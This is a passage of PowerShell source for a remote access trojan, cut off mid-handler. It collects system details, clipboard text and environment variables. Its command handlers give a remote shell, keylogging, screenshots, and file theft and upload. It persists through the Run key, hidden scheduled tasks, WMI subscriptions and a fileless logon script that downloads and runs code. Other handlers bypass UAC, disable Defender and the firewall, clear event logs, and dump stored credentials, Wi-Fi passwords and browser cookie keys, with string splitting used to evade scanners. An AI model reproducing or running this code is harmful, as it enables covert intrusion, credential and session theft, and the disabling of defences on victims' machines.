    $lip='?';try{$lip=([System.Net.Dns]::GetHostAddresses($env:COMPUTERNAME)|?{$_.AddressFamily -eq 'InterNetwork'}|select -First 1).IPAddressToString}catch{}
    $pip='?';try{$wr=[System.Net.HttpWebRequest]::Create('https://api.ipify.org');$wr.Timeout=3000;$rsp=$wr.GetResponse();$sr=New-Object System.IO.StreamReader($rsp.GetResponseStream());$pip=$sr.ReadToEnd().Trim();$sr.Close();$rsp.Close()}catch{}
    $adm=$false;try{$adm=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)}catch{}
    $drvs=@();try{$drvs=@(gwmi ('Win32_Logic'+'alDisk') -EA 0|%{@{drive=$_.DeviceID;label=$_.VolumeName;free_gb=$(if($_.Size){[math]::Round($_.FreeSpace/1GB,1)}else{0});total_gb=$(if($_.Size){[math]::Round($_.Size/1GB,1)}else{0});fs=$_.FileSystem}})}catch{}
    $nets=@();try{$nets=@(gwmi ('Win32_NetworkAdapterConfig'+'uration') -EA 0|?{$_.IPEnabled}|%{@{name=$_.Description;ip=($_.IPAddress-join',');mac=$_.MACAddress;gateway=($_.DefaultIPGateway-join',')}})}catch{}
    $usrs=@();try{$usrs=@(Get-LocalUser -EA 0|%{@{name=$_.Name;enabled=$_.Enabled;last_login="$($_.LastLogon)"}})}catch{}
    $ev='';try{$v=[Environment]::GetEnvironmentVariables();$ev=($v.Keys|sort|%{"$_=$($v[$_])"})-join"`n";if($ev.Length -gt 3000){$ev=$ev.Substring(0,3000)+'[truncated]'}}catch{}
    $aw=@{title='';pid=0;process=''};try{$sb2=New-Object System.Text.StringBuilder(512);$hw=[NM]::GetForegroundWindow();[NM]::GetWindowText($hw,$sb2,512)|Out-Null;$p2=[uint32]0;[NM]::GetWindowThreadProcessId($hw,[ref]$p2)|Out-Null;$pr2=Get-Process -Id ([int]$p2) -EA 0;$aw=@{title=$sb2.ToString();pid=[int]$p2;process="$($pr2.Name)"}}catch{}
    $cb='';try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;$cb=[System.Windows.Forms.Clipboard]::GetText()}catch{}
    @{hostname=$hn;username=$un;domain=$dom;architecture=$arch;os='Windows';os_version=$osv;os_release=$osr;os_build=$osb;cpu_model=$cpu;ram_gb=$ram;local_ip=$lip;public_ip=$pip;is_admin=$adm;uptime=$bt;drives=$drvs;network_adapters=$nets;users=$usrs;env_vars=$ev;active_window=$aw;clipboard=$cb}
  }catch{
    @{hostname=$env:COMPUTERNAME;username=$env:USERNAME;domain=$env:USERDOMAIN;architecture=$env:PROCESSOR_ARCHITECTURE;os='Windows';os_version='?';os_release='?';os_build='?';cpu_model='?';ram_gb='?';local_ip='?';public_ip='?';is_admin=$false;uptime='?';drives=@();network_adapters=@();users=@();env_vars='';active_window=@{title='';pid=0;process=''};clipboard=''}
  }
}
function HC($C){
  $t=[string]($C.type)
  switch($t){
    'ping'{@{status='ok';data='pong'}}
    'os_info'{@{status='ok';data=(REGINFO)}}
    'shell'{try{$si=New-Object System.Diagnostics.ProcessStartInfo "$env:SystemRoot\System32\cmd.exe";$si.Arguments="/c $($C.command)";$si.UseShellExecute=$false;$si.RedirectStandardOutput=$true;$si.RedirectStandardError=$true;$si.CreateNoWindow=$true;$pr=New-Object System.Diagnostics.Process;$pr.StartInfo=$si;$pr.Start()|Out-Null;$o=$pr.StandardOutput.ReadToEnd();$e=$pr.StandardError.ReadToEnd();$pr.WaitForExit(60000);@{status='ok';data="$o$e"}}catch{@{status='error';message=$_.Exception.Message}}}
    'screenshot'{try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;[Reflection.Assembly]::LoadWithPartialName('System.Draw'+'ing')|Out-Null;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b);$mth='Copy'+'FromScreen';$g.$mth($s.Location,[System.Drawing.Point]::Empty,$s.Size);$ms=New-Object System.IO.MemoryStream;$jc=([System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders()|?{$_.MimeType-eq'image/jpeg'})[0];$ep=New-Object System.Drawing.Imaging.EncoderParameters(1);$ep.Param[0]=New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality,[long]40);$b.Save($ms,$jc,$ep);@{status='ok';data=[Convert]::ToBase64String($ms.ToArray());encoding='base64'}}catch{@{status='error';message=$_.Exception.Message}}}
    'file_list'{try{$d=@(gci $C.path -Force -EA Stop|%{@{name=$_.Name;path=$_.FullName;is_dir=$_.PSIsContainer;size=$(if($_.PSIsContainer){0}else{$_.Length});modified=$_.LastWriteTime.ToFileTimeUtc()}});@{status='ok';data=$d}}catch{@{status='error';message=$_.Exception.Message}}}
    'file_download'{try{$b=[IO.File]::ReadAllBytes($C.path);@{status='ok';data=[Convert]::ToBase64String($b);filename=[IO.Path]::GetFileName($C.path);encoding='base64'}}catch{@{status='error';message=$_.Exception.Message}}}
    'file_upload'{try{$d=[IO.Path]::GetDirectoryName($C.path);if($d){[IO.Directory]::CreateDirectory($d)|Out-Null};[IO.File]::WriteAllBytes($C.path,[Convert]::FromBase64String($C.data));@{status='ok';data='Uploaded'}}catch{@{status='error';message=$_.Exception.Message}}}
    'file_delete'{try{ri $C.path -Recurse -Force -EA Stop;@{status='ok';data='Deleted'}}catch{@{status='error';message=$_.Exception.Message}}}
    'process_list'{try{$p=@(Get-Process|%{@{pid=$_.Id;name=$_.Name;cpu=[math]::Round([double]($_.CPU),1);mem=[math]::Round($_.WorkingSet/1MB,1);title=$_.MainWindowTitle}}|sort name);@{status='ok';data=$p}}catch{@{status='error';message=$_.Exception.Message}}}
    'process_kill'{try{try{Stop-Process -Id $C.pid -Force -EA Stop}catch{$null=& "$env:SystemRoot\System32\taskkill.exe" /F /PID $C.pid 2>&1};@{status='ok';data="Killed PID $($C.pid)"}}catch{@{status='error';message=$_.Exception.Message}}}
    'clipboard_get'{try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;$ct=[System.Windows.Forms.Clipboard]::GetText();@{status='ok';data=$(if($ct){"$ct"}else{'(empty)'})}}catch{@{status='error';message=$_.Exception.Message}}}
    'clipboard_set'{try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;[System.Windows.Forms.Clipboard]::SetText($C.text);@{status='ok';data='Clipboard updated'}}catch{@{status='error';message=$_.Exception.Message}}}
    'drive_list'{try{$d=@(gwmi ('Win32_Logic'+'alDisk')|%{@{drive=$_.DeviceID;label=$_.VolumeName;type=$_.DriveType;free_gb=$(if($_.Size){[math]::Round($_.FreeSpace/1GB,1)}else{0});total_gb=$(if($_.Size){[math]::Round($_.Size/1GB,1)}else{0});fs=$_.FileSystem}});@{status='ok';data=$d}}catch{@{status='error';message=$_.Exception.Message}}}
    'network_info'{try{$a=@(gwmi ('Win32_NetworkAdapterConfig'+'uration')|?{$_.IPEnabled}|%{@{name=$_.Description;ip=($_.IPAddress-join',');mac=$_.MACAddress;gateway=($_.DefaultIPGateway-join',')}});@{status='ok';data=$a}}catch{@{status='error';message=$_.Exception.Message}}}
    'list_users'{try{$u=@(Get-LocalUser|%{@{name=$_.Name;enabled=$_.Enabled;last_login="$($_.LastLogon)"}});@{status='ok';data=$u}}catch{try{@{status='ok';data=(net user 2>&1|Out-String)}}catch{@{status='error';message=$_.Exception.Message}}}}
    'uptime'{try{$bt=gwmi ('Win32_Oper'+'atingSystem');$dt=[Management.ManagementDateTimeConverter]::ToDateTime($bt.LastBootUpTime);$up=(Get-Date)-$dt;@{status='ok';data="$($up.Days)d $($up.Hours)h $($up.Minutes)m | Boot: $dt"}}catch{@{status='error';message=$_.Exception.Message}}}
    'env_vars'{try{$v=[Environment]::GetEnvironmentVariables();@{status='ok';data=($v.Keys|sort|%{"$_=$($v[$_])"})-join"`n"}}catch{@{status='error';message=$_.Exception.Message}}}
    'active_window'{try{$sb=New-Object System.Text.StringBuilder(512);$hw=[NM]::GetForegroundWindow();[NM]::GetWindowText($hw,$sb,512)|Out-Null;$p2=[uint32]0;[NM]::GetWindowThreadProcessId($hw,[ref]$p2)|Out-Null;$pr=Get-Process -Id ([int]$p2) -EA 0;@{status='ok';data=@{title=$sb.ToString();pid=[int]$p2;process=$pr.Name}}}catch{@{status='error';message=$_.Exception.Message}}}
    'send_keys'{try{[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;[System.Windows.Forms.SendKeys]::SendWait($C.text);@{status='ok';data='Keys sent'}}catch{@{status='error';message=$_.Exception.Message}}}
    'persistence_add'{try{$n=$(if($C.name){$C.name}else{'WinHelper'});Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' $n $C.path;@{status='ok';data="Run key: $n"}}catch{@{status='error';message=$_.Exception.Message}}}
    'persistence_remove'{try{Remove-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' $(if($C.name){$C.name}else{'WinHelper'}) -EA 0;@{status='ok';data='Removed'}}catch{@{status='error';message=$_.Exception.Message}}}
    'scheduled_task_add'{try{$n=$(if($C.name){$C.name}else{'WindowsUpdateHelper'});$pf=$(if($C.path){$C.path}else{"$env:APPDATA\Microsoft\WindowsUpdate\wu.ps1"});$a=New-ScheduledTaskAction -Execute "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-w hidden -ep bypass -NoProfile -File `"$pf`"";$tg=New-ScheduledTaskTrigger -AtLogOn;$ss=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero);Register-ScheduledTask $n -Action $a -Trigger $tg -Settings $ss -RunLevel Highest -Force|Out-Null;@{status='ok';data="Task: $n"}}catch{@{status='error';message=$_.Exception.Message}}}
    'scheduled_task_remove'{try{Unregister-ScheduledTask $(if($C.name){$C.name}else{'WindowsUpdateHelper'}) -Confirm:$false -EA Stop;@{status='ok';data='Task removed'}}catch{@{status='error';message=$_.Exception.Message}}}
    'wmi_persist_add'{
      try{
        $n=$(if($C.name){$C.name}else{'WUService'})
        $pf=$(if($C.path){$C.path}else{"$env:APPDATA\Microsoft\WindowsUpdate\wu.ps1"})
        $fl=([wmiclass]'\\.\root\subscription:__EventFilter').CreateInstance()
        $fl.QueryLanguage='WQL';$fl.Name=$n;$fl.EventNamespace='root\cimv2'
        $fl.Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
        $fl.Put()|Out-Null
        $co=([wmiclass]'\\.\root\subscription:CommandLineEventConsumer').CreateInstance()
        $co.Name=$n;$co.CommandLineTemplate="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -ep bypass -NoProfile -File `"$pf`""
        $co.Put()|Out-Null
        $bn=([wmiclass]'\\.\root\subscription:__FilterToConsumerBinding').CreateInstance()
        $bn.Filter=$fl.Path.RelativePath;$bn.Consumer=$co.Path.RelativePath;$bn.Put()|Out-Null
        @{status='ok';data="WMI persist: $n"}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'wmi_persist_remove'{
      try{
        $n=$(if($C.name){$C.name}else{'WUService'})
        gwmi -Namespace root\subscription -Class __FilterToConsumerBinding|?{$_.Filter -like "*$n*"}|Remove-WmiObject -EA 0
        gwmi -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$n'"|Remove-WmiObject -EA 0
        gwmi -Namespace root\subscription -Class __EventFilter -Filter "Name='$n'"|Remove-WmiObject -EA 0
        @{status='ok';data="WMI removed: $n"}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'victim_msgbox'{try{$ti=$(if($C.title){$C.title}else{'System'});$mi=$(if($C.message){$C.message}else{''});Start-Job -ScriptBlock{param($ti,$mi);[Reflection.Assembly]::LoadWithPartialName('System.Windows.F'+'orms')|Out-Null;[System.Windows.Forms.MessageBox]::Show($mi,$ti)|Out-Null} -ArgumentList $ti,$mi|Out-Null;@{status='ok';data='MsgBox shown'}}catch{@{status='error';message=$_.Exception.Message}}}
    'download_exec'{try{$di=$(if($C.dest){$C.dest}else{"$env:TEMP\$(Split-Path $C.url -Leaf)"});$wc=New-Object System.Net.WebClient;$wc.DownloadFile($C.url,$di);Start-Process $di;@{status='ok';data="DL: $di"}}catch{@{status='error';message=$_.Exception.Message}}}
    'wallpaper_set'{try{$wp=$C.path;if($C.data){$wp="$env:TEMP\wp.bmp";[IO.File]::WriteAllBytes($wp,[Convert]::FromBase64String($C.data))};[NM]::SystemParametersInfo(20,0,$wp,3)|Out-Null;@{status='ok';data='Wallpaper set'}}catch{@{status='error';message=$_.Exception.Message}}}
    'keylogger_start'{
      if($script:KS){return @{status='ok';data='Already running'}}
      try{
        $sync=[hashtable]::Synchronized(@{buf='';running=$true})
        $rs=[RunspaceFactory]::CreateRunspace();$rs.Open()
        $rs.SessionStateProxy.SetVariable('sync',$sync)
        $kp=[PowerShell]::Create();$kp.Runspace=$rs
        [void]$kp.AddScript({
          $_kbc='using System;using System.Runtime.Interop'+'Services;public class KB{[Dll'+'Import("user32.dll")]public static extern short GetAsyncKeyState(int k);}'
          try{Add-Type -TypeDefinition $_kbc -Language CSharp}catch{}
          $gaks='GetAsync'+'KeyState'
          $m=@{8='[BS]';9='[TAB]';13='[ENTER]';27='[ESC]';32=' ';186=';';187='=';188=',';189='-';190='.';191='/';219='[';221=']';220='\';222="'"}
          while($sync.running){
            $sh=([KB]::$gaks(16)-band 0x8000)-ne 0
            65..90|%{if([KB]::$gaks($_)-band1){$c=[char]$_;$sync.buf+=if($sh){$c}else{$c.ToString().ToLower()}}}
            48..57|%{if([KB]::$gaks($_)-band1){$sync.buf+=[char]$_}}
            $m.Keys|%{if([KB]::$gaks($_)-band1){$sync.buf+=$m[$_]}}
            Start-Sleep -Milliseconds 20
          }
        })
        [void]$kp.BeginInvoke()
        $script:KS=$sync;$script:KR=$rs;$script:KP=$kp
        @{status='ok';data='Keylogger started'}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'keylogger_stop'{if($script:KS){$script:KS.running=$false;Start-Sleep -Milliseconds 200;try{$script:KR.Close()}catch{};$script:KS=$null;$script:KR=$null;$script:KP=$null};@{status='ok';data='Keylogger stopped'}}
    'keylogger_dump'{if(!$script:KS){@{status='error';message='Not running'}}else{$d=$script:KS.buf;$script:KS.buf='';@{status='ok';data=$(if($d){"$d"}else{'(none)'})}}}
    'shutdown'{try{& "$env:SystemRoot\System32\shutdown.exe" /s /t 2}catch{};@{status='ok';data='Shutdown'}}
    'restart'{try{& "$env:SystemRoot\System32\shutdown.exe" /r /t 2}catch{};@{status='ok';data='Restart'}}
    'lock_screen'{try{& "$env:SystemRoot\System32\rundll32.exe" user32.dll,LockWorkStation}catch{};@{status='ok';data='Locked'}}
    'signout'{try{& "$env:SystemRoot\System32\shutdown.exe" /l}catch{};@{status='ok';data='Signout'}}
    'open_url'{Start-Process $C.url;@{status='ok';data='Opened'}}
    'netstat'{try{$r=@(Get-NetTCPConnection -EA 0|%{try{$pn=(Get-Process -Id $_.OwningProcess -EA 0).Name}catch{$pn='?'};@{local="$($_.LocalAddress):$($_.LocalPort)";remote="$($_.RemoteAddress):$($_.RemotePort)";state=[string]$_.State;pid=$_.OwningProcess;process=$pn}});if(-not $r){$r=(& netstat -ano 2>&1)|Out-String};@{status='ok';data=$r}}catch{@{status='error';message=$_.Exception.Message}}}
    'installed_software'{try{$pp=@('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*','HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*','HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*');$r=@($pp|%{try{Get-ItemProperty $_ -EA 0}catch{@()}}|%{$_}|?{$_.DisplayName}|%{@{name=$_.DisplayName;version=$_.DisplayVersion;publisher=$_.Publisher;date=$_.InstallDate}}|sort name);@{status='ok';data=$r}}catch{@{status='error';message=$_.Exception.Message}}}
    'wifi_passwords'{try{$r=@(netsh wlan show profiles 2>&1|Select-String 'All User Profile'|%{$n=($_ -replace '.*:\s*','').Trim();$pw='';try{$d=netsh wlan show profile name=$n key=clear 2>&1;$kl=$d|Select-String 'Key Content';if($kl){$pw=($kl -replace '.*:\s*','').Trim()}}catch{};@{ssid=$n;password=$(if($pw){$pw}else{'(none/WPA-Enterprise)'})}}|sort ssid);@{status='ok';data=$r}}catch{@{status='error';message=$_.Exception.Message}}}
    'browser_history'{try{$bases=@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data";Brave="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";Firefox="$env:APPDATA\Mozilla\Firefox\Profiles";Opera="$env:APPDATA\Opera Software\Opera Stable"};$r=@();foreach($b in $bases.Keys){if(Test-Path $bases[$b]){$hp="$($bases[$b])\Default\History";if(Test-Path $hp){$r+=@{browser=$b;history_db=$hp;size_kb=[math]::Round((Get-Item $hp).Length/1KB,1);hint='Use file_download to retrieve SQLite DB'}}else{$bp=Get-ChildItem $bases[$b] -Directory -EA 0|?{Test-Path "$($_.FullName)\History"}|Select -First 1;if($bp){$r+=@{browser=$b;history_db="$($bp.FullName)\History";size_kb=[math]::Round((Get-Item "$($bp.FullName)\History").Length/1KB,1);hint='Use file_download'}}}}};@{status='ok';data=$(if($r){$r}else{'No browser profiles found'})}}catch{@{status='error';message=$_.Exception.Message}}}
    'services_list'{try{$s=@(Get-Service -EA 0|%{@{name=$_.Name;display=$_.DisplayName;status=[string]$_.Status;start_type=[string]$_.StartType}}|sort name);@{status='ok';data=$s}}catch{@{status='error';message=$_.Exception.Message}}}
    'service_control'{try{$sn=$C.service;$ac=$C.action;switch($ac){'start'{Start-Service $sn -EA Stop};'stop'{Stop-Service $sn -Force -EA Stop};'restart'{Restart-Service $sn -Force -EA Stop};'enable'{Set-Service $sn -StartupType Automatic -EA Stop};'disable'{Set-Service $sn -StartupType Disabled -EA Stop};default{throw "Unknown action: $ac"}};@{status='ok';data="$ac '$sn' OK"}}catch{@{status='error';message=$_.Exception.Message}}}
    'registry_read'{try{$v=Get-ItemProperty -Path $C.path -EA Stop;$d=@{};$v.PSObject.Properties|?{$_.Name -notmatch '^PS'}|%{$d[$_.Name]="$($_.Value)"};@{status='ok';data=$d}}catch{@{status='error';message=$_.Exception.Message}}}
    'registry_write'{try{if(!(Test-Path $C.path)){New-Item -Path $C.path -Force|Out-Null};Set-ItemProperty -Path $C.path -Name $C.name -Value $C.value -EA Stop;@{status='ok';data="Written $($C.name) @ $($C.path)"}}catch{@{status='error';message=$_.Exception.Message}}}
    'registry_delete'{try{if($C.name){Remove-ItemProperty -Path $C.path -Name $C.name -Force -EA Stop}else{Remove-Item -Path $C.path -Recurse -Force -EA Stop};@{status='ok';data='Deleted'}}catch{@{status='error';message=$_.Exception.Message}}}
    'clear_logs'{try{$lg=@('Application','Security','System','Windows PowerShell','Microsoft-Windows-PowerShell/Operational');$lg|%{try{wevtutil cl $_ 2>&1|Out-Null}catch{}};@{status='ok';data="Cleared: $($lg -join ', ')"}}catch{@{status='error';message=$_.Exception.Message}}}
    'disable_defender'{
      try{
        $rg='HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'
        if(!(Test-Path $rg)){New-Item $rg -Force -EA 0|Out-Null}
        Set-ItemProperty $rg 'DisableAntiSpyware' 1 -EA 0
        Set-ItemProperty $rg 'DisableAntiVirus' 1 -EA 0
        $rg2=$rg+'\Real-Time Protection'
        if(!(Test-Path $rg2)){New-Item $rg2 -Force -EA 0|Out-Null}
        @('DisableRealtimeMonitoring','DisableIOAVProtection','DisableBehaviorMonitoring','DisableOnAccessProtection','DisableScanOnRealtimeEnable')|%{Set-ItemProperty $rg2 $_ 1 -EA 0}
        $null=& "$env:SystemRoot\System32\sc.exe" stop WinDefend 2>&1
        $null=& "$env:SystemRoot\System32\sc.exe" config WinDefend start= disabled 2>&1
        @{status='ok';data='Defender disabled via policy registry + service stop. Reboot solidifies effect.'}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'disable_firewall'{
      try{
        $fps=@('StandardProfile','PublicProfile','DomainProfile')
        $fps|%{
          $rp="HKLM:\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\$_"
          if(Test-Path $rp){Set-ItemProperty $rp 'EnableFirewall' 0 -EA 0}
        }
        $null=& "$env:SystemRoot\System32\sc.exe" stop MpsSvc 2>&1
        @{status='ok';data='Firewall disabled via registry (all profiles) + service stop.'}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'dump_credentials'{
      try{
        $out=@()
        $out+="=== CMDKEY STORED CREDENTIALS ===`n"
        $out+=(& "$env:SystemRoot\System32\cmdkey.exe" /list 2>&1|Out-String)+"`n"
        $out+="=== POWERSHELL COMMAND HISTORY ===`n"
        try{$hf="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";if(Test-Path $hf){$out+=(Get-Content $hf -Raw -EA 0)+"`n"}}catch{}
        $out+="=== RECENTLY TYPED URLS (IE/Edge) ===`n"
        try{$urls=Get-ItemProperty 'HKCU:\Software\Microsoft\Internet Explorer\TypedURLs' -EA 0;if($urls){$urls.PSObject.Properties|?{$_.Name -ne 'PSPath' -and $_.Name -notmatch '^PS'}|%{$out+="  $($_.Value)`n"}}}catch{}
        $out+="=== RECENT DOCS ===`n"
        try{$rd=Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs' -EA 0;if($rd){$rd.PSObject.Properties|?{$_.Name -notmatch '^PS'}|Select -First 20|%{try{$b=$_.Value;if($b -is [byte[]]){$s=[Text.Encoding]::Unicode.GetString($b).TrimEnd([char]0);$out+="  $s`n"}}catch{}}}}catch{}
        $out+="=== MRU SAVED NETWORK CREDS (vault enumerate) ===`n"
        try{$vt=& "$env:SystemRoot\System32\vaultcmd.exe" /listcreds:'Windows Credentials' /all 2>&1|Out-String;$out+=$vt+"`n"}catch{}
        try{$vt2=& "$env:SystemRoot\System32\vaultcmd.exe" /listcreds:'Web Credentials' /all 2>&1|Out-String;$out+=$vt2+"`n"}catch{}
        $out+="=== SAVED RDP/NETWORK CREDENTIALS ===`n"
        try{$rcm=& "$env:SystemRoot\System32\cmdkey.exe" /list 2>&1|Select-String 'TERMSRV|Domain:';$out+=($rcm|Out-String)+"`n"}catch{}
        $out+="=== WINDOWS AUTOLOGON ===`n"
        try{$al=Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -EA 0;@('DefaultUserName','DefaultPassword','DefaultDomainName','AltDefaultUserName','AltDefaultPassword')|%{$v=$al.$_;if($v){$out+="  $_=$v`n"}}}catch{}
        @{status='ok';data=($out -join '')}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'arp_scan'{
      try{
        $gw=(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -EA 0|Select -First 1).NextHop
        $sub=$gw -replace '\.\d+$',''
        $pool=[runspacefactory]::CreateRunspacePool(1,50);$pool.Open()
        $sc={param($ip);try{$pg=[Net.NetworkInformation.Ping]::new();$rs=$pg.Send($ip,500);if($rs.Status-eq'Success'){$h='';try{$h=[Net.Dns]::GetHostEntry($ip).HostName}catch{};[pscustomobject]@{ip=$ip;hostname=$h;rtt=$rs.RoundtripTime}}}catch{}}
        $jobs=1..254|%{$ip="$sub.$_";$ps=[powershell]::Create();$ps.RunspacePool=$pool;[void]$ps.AddScript($sc).AddArgument($ip);@{ps=$ps;h=$ps.BeginInvoke()}}
        $r=@($jobs|%{try{$_.ps.EndInvoke($_.h)}catch{}}|?{$_}|sort{[version]$_.ip}|%{@{ip=$_.ip;hostname=$_.hostname;rtt_ms=$_.rtt}})
        $pool.Close()
        @{status='ok';data=$(if($r.Count){$r}else{'No hosts responded'})}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'run_ps'{try{$sb=[scriptblock]::Create($C.code);$r=&$sb 2>&1|Out-String;@{status='ok';data=$r}}catch{@{status='error';message=$_.Exception.Message}}}
    'uac_bypass'{try{$rp='HKCU:\Software\Classes\ms-settings\Shell\Open\command';if(!(Test-Path $rp)){New-Item -Path $rp -Force|Out-Null};Set-ItemProperty -Path $rp -Name '(Default)' -Value $C.command;New-ItemProperty -Path $rp -Name 'DelegateExecute' -Value '' -PropertyType String -Force|Out-Null;Start-Process fodhelper.exe -WindowStyle Hidden;Start-Sleep -Seconds 2;Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force -EA 0;@{status='ok';data="UAC bypass executed via fodhelper: $($C.command)"}}catch{@{status='error';message=$_.Exception.Message}}}
    'fileless_persist'{
      try{
        $n=$(if($C.name){$C.name}else{'MicrosoftUpdate'})
        $sc="[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=3072;iex((New-Object Net.WebClient).DownloadString('$_URL/p'))"
        $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($sc))
        $cmd="%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe -nop -noni -w 1 -ep bypass -ec $enc"
        Set-ItemProperty 'HKCU:\Environment' 'UserInitMprLogonScript' $cmd -EA Stop
        @{status='ok';data="Stealth logon persist '$n' installed via UserInitMprLogonScript (executes at logon via userinit.exe, no Run key)"}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'fileless_task'{
      try{
        $n=$(if($C.name){$C.name}else{'MicrosoftUpdateTask'})
        $sc="[Net.ServicePointManager]::ServerCertificateValidationCallback={`$true};[Net.ServicePointManager]::SecurityProtocol=3072;iex((New-Object Net.WebClient).DownloadString('$_URL/p'))"
        $enc=[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($sc))
        $a=New-ScheduledTaskAction -Execute "%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-nop -noni -w 1 -ep bypass -ec $enc"
        $tg=New-ScheduledTaskTrigger -AtLogOn
        $ss=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1)
        Register-ScheduledTask $n -Action $a -Trigger $tg -Settings $ss -Force|Out-Null
        @{status='ok';data="Fileless Scheduled Task '$n' installed (no file on disk)"}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'cookie_steal'{
      try{
        $out=@()
        Add-Type -AssemblyName System.Security -EA 0
        $cbs=@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data";Brave="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
        foreach($bn in $cbs.Keys){
          $bp=$cbs[$bn]
          if(!(Test-Path $bp)){continue}
          $aesB64=''
          try{
            $lsp="$bp\Local State"
            if(Test-Path $lsp){
              $ls=Get-Content $lsp -Raw -EA 0|ConvertFrom-Json
              $ek=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
              $ek=$ek[5..($ek.Length-1)]
              $ak=[Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')
              $aesB64=[Convert]::ToBase64String($ak)
            }
          }catch{}
          $profs=@('Default')+@(Get-ChildItem $bp -Directory -EA 0|?{$_.Name -match '^Profile \d+'}|%{$_.Name})
          foreach($pf in $profs){
            $cp="$bp\$pf\Network\Cookies"
            if(!(Test-Path $cp)){$cp="$bp\$pf\Cookies"}
            if(!(Test-Path $cp)){continue}
            try{
              $tmp="$env:TEMP\ck$(Get-Random).db"
              [IO.File]::Copy($cp,$tmp,$true)
              $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
              Remove-Item $tmp -EA 0
              $out+=@{browser=$bn;profile=$pf;db_b64=$b64;aes_key_b64=$aesB64}
            }catch{}
          }
        }
        $ffdir="$env:APPDATA\Mozilla\Firefox\Profiles"
        if(Test-Path $ffdir){
          Get-ChildItem $ffdir -Directory -EA 0|%{
            $cp="$($_.FullName)\cookies.sqlite"
            if(Test-Path $cp){
              try{
                $tmp="$env:TEMP\ffck$(Get-Random).db"
                [IO.File]::Copy($cp,$tmp,$true)
                $b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($tmp))
                Remove-Item $tmp -EA 0
                $out+=@{browser='Firefox';profile=$_.Name;db_b64=$b64;aes_key_b64=''}
              }catch{}
            }
          }
        }
        @{status='ok';data=$out;count=$out.Count}
      }catch{@{status='error';message=$_.Exception.Message}}
    }
    'browser_logins'{
      try{
        $out=@()
        Add-Type -AssemblyName System.Security -EA 0
        $cbs=@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data";Brave="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"}
        foreach($bn in $cbs.Keys){
          $bp=$cbs[$bn]
          if(!(Test-Path $bp)){continue}
          $aesB64=''
          try{
            $lsp="$bp\Local State"
            if(Test-Path $lsp){
              $ls=Get-Content $lsp -Raw -EA 0|ConvertFrom-Json
              $ek=[Convert]::FromBase64String($ls.os_crypt.encrypted_key)
              $ek=$ek[5..($ek.Length-1)]
              $ak=[Security.Cryptography.ProtectedData]::Unprotect($ek,$null,'CurrentUser')
              $aesB64=[Convert]::ToBase64String($ak)
            }
          }catch{}
          $profs=@('Default')+@(Get-ChildItem $bp -Directory -EA 0|?{$_.Name -match '^Profile \d+'}|%{$_.Name})
          foreach($pf in $profs){
